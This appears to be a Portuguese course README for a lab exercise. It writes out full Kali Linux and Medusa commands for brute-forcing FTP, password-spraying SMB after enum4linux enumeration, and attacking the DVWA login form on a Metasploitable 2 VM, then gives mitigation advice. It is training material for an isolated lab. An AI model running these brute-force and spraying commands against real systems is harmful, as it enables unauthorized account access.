# 📌 Descrição do Desafio

Implementar, documentar e compartilhar um projeto prático utilizando **Kali Linux** e a ferramenta **Medusa**, em conjunto com ambientes vulneráveis (como **Metasploitable 2** e **DVWA**), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

- **Configurar o ambiente:** duas VMs (Kali Linux e Metasploitable 2) no VirtualBox, com rede interna (host-only).  
- **Executar ataques simulados:** força bruta em FTP, automação de tentativas em formulário web (DVWA) e password spraying em SMB com enumeração de usuários.  
- **Documentar os testes:** wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.

---

# 🧭 Guia do Projeto: Força Bruta com Kali e Medusa

---

## 1. ⚙️ Configuração do Ambiente

O primeiro passo é garantir que seu ambiente de laboratório esteja funcional e isolado.

### • Software Necessário:
- **VirtualBox** (ou VMware).
- **Kali Linux VM:** máquina atacante.
- **Metasploitable 2 VM:** máquina vítima (contém serviços vulneráveis como FTP e SMB).
- **DVWA:** rodando no Metasploitable 2 separadamente.

### • Configuração de Rede:
- Em ambas as VMs, defina o adaptador de rede como **Internal Network / Host-Only**.
- Descubra o IP do Metasploitable 2 utilizando o comando: ```ip a```
- Verifique a conectividade entre as máquinas usando o comando *ping* ```ping 192.168.56.101```


---

## 2. 🛡️ Cenários de Ataque Simulado com Medusa

O **Medusa** é uma ferramenta de força bruta rápida, paralela e modular.  
Antes dos ataques, identifique portas abertas com o comando: ```nmap -sV -p 21,22,80,445,139 192.168.56.101```


---

## 🔹 Cenário A: Força Bruta em FTP (Metasploitable 2)

O FTP (porta 21) é vulnerável, e o Metasploitable 2 usa credenciais padrão como `msfadmin:msfadmin`.

### Passo a Passo:

| Passo | Comando (Exemplo) | Objetivo |
|-------|-------------------|----------|
| **1. Wordlists** | ```echo -e "user\nmsfadmin\nadmin\nroot" > usuarios.txt```<br>```echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas.txt``` | Criar listas de usuários e senhas. |
| **2. Ataque** | ```medusa -h 192.168.56.101 -U usuarios.txt -p senhas.txt -M ftp -t 6``` | Testa todas as combinações com 6 threads simultâneas. |
| **3. Validação** | ```ftp 192.168.56.101``` | Validar login com as credenciais encontradas. |

---

## 🔹 Cenário B: Password Spraying em SMB (Metasploitable 2)

Password spraying = tentar **uma senha** em **muitos usuários**, evitando travar contas.

### Passo a Passo:

| Passo | Ferramenta/Comando | Objetivo |
|-------|--------------------|----------|
| **1. Enumeração** | ```bash enum4linux -a 192.168.56.101 \ tee enum4_saidas.txt``` (Modifique a barra invertida por pipe) Para Visualizar: ```less enum4_saidas.txt``` | Coletar usuários do SMB. |
| **2. Wordlist** | ```echo -e "user\nmsfadmin\nservice" > smb_usuarios.txt```<br>```echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt``` | Criar listas de usuários e senhas. |
| **3. Ataque** | ```medusa -h 192.168.56.101 -U smb_usuarios.txt -p senhas_spray.txt -M smb -t 2 -T 50``` | Testa senhas comuns em todos usuários. |
| **4. Validação** | ```smbclient //192.168.56.101/tmp``` | Verificar acesso com credencial encontrada. |

---

## 🔹 Cenário C: Automação em Formulário Web (DVWA)

Ataques HTTP POST exigem inspeção da requisição.

### Passo a Passo:

| Passo | Comando | Objetivo |
|-------|---------|----------|
| **1. Acesso** | Acesse: <http://192.168.56.101/dvwa/login.php> | Abrir DVWA |
| **2. Wordlists** | ```echo -e "user\nmsfadmin\nadmin\nroot" > usuarios.txt```<br>```echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas.txt``` | Criar Listas de Usuários e Senhas |
| **3. Ataque** | ```medusa -h 192.168.56.101 -U usuarios.txt -p senhasdvwa.txt -M http \ -m PAGE:'/dvwa/login.php' \ -m FORM:'username=^USER^&password=^PASS^&Login=Login' \ -m FAIL:'Login failed' -t 6``` | Testa credenciais via HTTP POST |
| **4. Validação** | Logar manualmente na DVWA <http://192.168.56.101/dvwa/login.php> com usuario e senha do medusa | Confirmar acesso |

---

# 3. 📝 Recomendações de Mitigação (O Coração do Desafio)

## 🔐 1. Prevenção Geral de Força Bruta
- Senhas complexas e trocas periódicas.
- **Rate Limiting** por IP após X falhas.
- **Account Lockout** após Y tentativas.

## 📦 2. Mitigação para FTP/SMB
- Desativar serviços não utilizados.
- Preferir **SFTP/SSH** ou FTPS com chaves.
- Monitorar logs para picos de falhas.

## 🌐 3. Mitigação para Aplicações Web (DVWA)
- CAPTCHA e/ou **2FA**.
- Tokens **anti-CSRF**.
- Uso de **WAF** (Web Application Firewall).

---

# 🤔 Reflexão Final
**Por que o Metasploitable 2 é tão vulnerável?**  
- Uso de **senhas padrão**  
- **Serviços desnecessários abertos**  
- Falta de **rate limiting**, **hardening** e **monitoramento**  



